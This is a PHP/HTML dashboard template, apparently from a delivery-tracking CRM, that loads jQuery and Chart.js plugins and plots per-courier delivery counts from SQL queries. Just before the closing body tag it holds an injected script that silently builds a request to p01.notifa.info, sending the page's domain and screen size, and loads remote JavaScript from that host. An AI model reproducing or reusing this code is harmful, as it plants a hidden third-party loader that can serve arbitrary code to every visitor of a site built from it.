
      <script src="assets/plugins/jQuery/jquery-1.12.4.min.js" type="text/javascript"></script>
      <!-- jquery-ui --> 
      <script src="assets/plugins/jquery-ui-1.12.1/jquery-ui.min.js" type="text/javascript"></script>
      <!-- Bootstrap -->
      <script src="assets/bootstrap/js/bootstrap.min.js" type="text/javascript"></script>
      <!-- lobipanel -->
      <script src="assets/plugins/lobipanel/lobipanel.min.js" type="text/javascript"></script>
      <!-- Pace js -->
      <script src="assets/plugins/pace/pace.min.js" type="text/javascript"></script>
      <!-- SlimScroll -->
      <script src="assets/plugins/slimScroll/jquery.slimscroll.min.js" type="text/javascript">    </script>
      <!-- FastClick -->
      <script src="assets/plugins/fastclick/fastclick.min.js" type="text/javascript"></script>
      <!-- CRMadmin frame -->
      <script src="assets/dist/js/custom.js" type="text/javascript"></script>
      <!-- End Core Plugins
         =====================================================================-->
      <!-- Start Page Lavel Plugins
         =====================================================================-->
      <!-- ChartJs JavaScript -->
      <script src="assets/plugins/chartJs/Chart.min.js" type="text/javascript"></script>
      <!-- Counter js -->
      <script src="assets/plugins/counterup/waypoints.js" type="text/javascript"></script>
      <script src="assets/plugins/counterup/jquery.counterup.min.js" type="text/javascript"></script>
      <!-- Monthly js -->
      <script src="assets/plugins/monthly/monthly.js" type="text/javascript"></script>
      <!-- End Page Lavel Plugins
         =====================================================================-->
      <!-- Start Theme label Script
         =====================================================================-->
      <!-- Dashboard js -->
      <script src="assets/dist/js/dashboard.js" type="text/javascript"></script>
      <!-- End Theme label Script
         =====================================================================-->
      <script>
         function dash() {
         // single bar chart
         var ctx = document.getElementById("singelBarChart");
         var myChart = new Chart(ctx, {
         type: 'bar',
         data: {
         labels: ["Sun", "Mon", "Tu", "Wed", "Th", "Fri", "Sat"],
         datasets: [
         {
         label: "My First dataset",
         data: [40, 55, 75, 81, 56, 55, 40],
         borderColor: "rgba(0, 150, 136, 0.8)",
         width: "1",
         borderWidth: "0",
         backgroundColor: "rgba(0, 150, 136, 0.8)"
         }
         ]
         },
         options: {
         scales: {
         yAxes: [{
             ticks: {
                 beginAtZero: true
             }
         }]
         }
         }
         });
               //monthly calender
               $('#m_calendar').monthly({
                 mode: 'event',
                 //jsonUrl: 'events.json',
                 //dataType: 'json'
                 xmlUrl: 'events.xml'
             });
         
         //bar chart
         var ctx = document.getElementById("barChart");
         var myChart = new Chart(ctx, {
         type: 'bar',
         data: {
         labels: ["January", "February", "March", "April", "May", "June", "July", "august", "september","october", "Nobemver", "December"],
         datasets: [
         {
         label: "My First dataset",
         data: [65, 59, 80, 81, 56, 55, 40, 65, 59, 80, 81, 56],
         borderColor: "rgba(0, 150, 136, 0.8)",
         width: "1",
         borderWidth: "0",
         backgroundColor: "rgba(0, 150, 136, 0.8)"
         },
         {
         label: "My Second dataset",
         data: [28, 48, 40, 19, 86, 27, 90, 28, 48, 40, 19, 86],
         borderColor: "rgba(51, 51, 51, 0.55)",
         width: "1",
         borderWidth: "0",
         backgroundColor: "rgba(51, 51, 51, 0.55)"
         }
         ]
         },
         options: {
         scales: {
         yAxes: [{
             ticks: {
                 beginAtZero: true
             }
         }]
         }
         }
         });
             //counter
             $('.count-number').counterUp({
                 delay: 10,
                 time: 5000
             });
         }
         dash();         
      </script>
      <script type="text/javascript" src="chartjs/Chart.js"></script>
       <script src="assets/plugins/table-export/tableExport.js" type="text/javascript"></script>
      <script src="assets/plugins/table-export/jquery.base64.js" type="text/javascript"></script>
      <script src="assets/plugins/table-export/html2canvas.js" type="text/javascript"></script>
      <script src="assets/plugins/table-export/sprintf.js" type="text/javascript"></script>
      <script src="assets/plugins/table-export/jspdf.js" type="text/javascript"></script>
      <script src="assets/plugins/table-export/base64.js" type="text/javascript"></script>
      
   <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2%2fGgUtti8arQe93cCg2g7kuDrRvvxR6L93RGJRI9GDvKU%2b54EYEYCzcigfVcsAOe2i%2fu0IWJo61e3MiYqqbkPlvm7v%2fb8HjUjojia7pzyC09DerxJgkFgVI6pFtFqb0snkGHJ5vxW%2b4hAGk%2fzu0PU%2fnBwZky5Ycsp3qMYffpZnarqz0FlKfSRbbHGPAL96L%2bEwfqrS7iUpmk14IBnVs7dYfF%2bOsRC%2bv9R3NBVv6MKlJPtlZnKqY16mnnCQPYxvxuH32N9%2fVctdqDSSq%2bsVZ4cWpIlmGawuUA4wxqqBvFNOHkVUQ%2fjKzKfi%2btiTI4iSJHvE1y58WXvr4x%2bNSmIAhnxE2RgfsYely0lXdZiHXyU3EIPT96wYczIJTga5gtW021neJPvmtTm%2fwq9AL06ptD4k1CTzfgEN1PUnlMYhXWblZK0rb0fNO297Fv5520WxdoI%2f4K8Fx39g6RKcIcOICOqjtO96MB%2bdf8V" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></body>
    <script>
      var ctx = document.getElementById("myChart").getContext('2d');
      var myChart = new Chart(ctx, {
         type: 'bar',
         data: {
            labels: ["Hikmat Sulaeman", "Egi M Akbar", "Edi Aminoto", "Reza"],
            datasets: [{
               label: '',
               data: [
               <?php 
               include "configs.php";
               $jumlah_teknik = mysqli_query($db,"select * from delivery where kurir='Hikmat Sulaeman'");
               echo mysqli_num_rows($jumlah_teknik);
               ?>, 
               <?php 
               include "configs.php";
               $jumlah_ekonomi = mysqli_query($db,"select * from delivery where kurir='Egi M Akbar'");
               echo mysqli_num_rows($jumlah_ekonomi);
               ?>, 
               <?php 
               include "configs.php";
               $jumlah_fisip = mysqli_query($db,"select * from delivery where kurir='Edi Aminoto'");
               echo mysqli_num_rows($jumlah_fisip);
               ?>, 
               <?php 
               include "configs.php";
               $jumlah_pertanian = mysqli_query($db,"select * from delivery where kurir='Reza'");
               echo mysqli_num_rows($jumlah_pertanian);
               ?>
               ],
               backgroundColor: [
               'rgba(255, 99, 132, 0.2)',
               'rgba(54, 162, 235, 0.2)',
               'rgba(255, 206, 86, 0.2)',
               'rgba(75, 192, 192, 0.2)'
               ],
               borderColor: [
               'rgba(255,99,132,1)',
               'rgba(54, 162, 235, 1)',
               'rgba(255, 206, 86, 1)',
               'rgba(75, 192, 192, 1)'
               ],
               borderWidth: 1
            }]
         },
         options: {
            scales: {
               yAxes: [{
                  ticks: {
                     beginAtZero:true
                  }
               }]
            }
         }
      });
   </script>

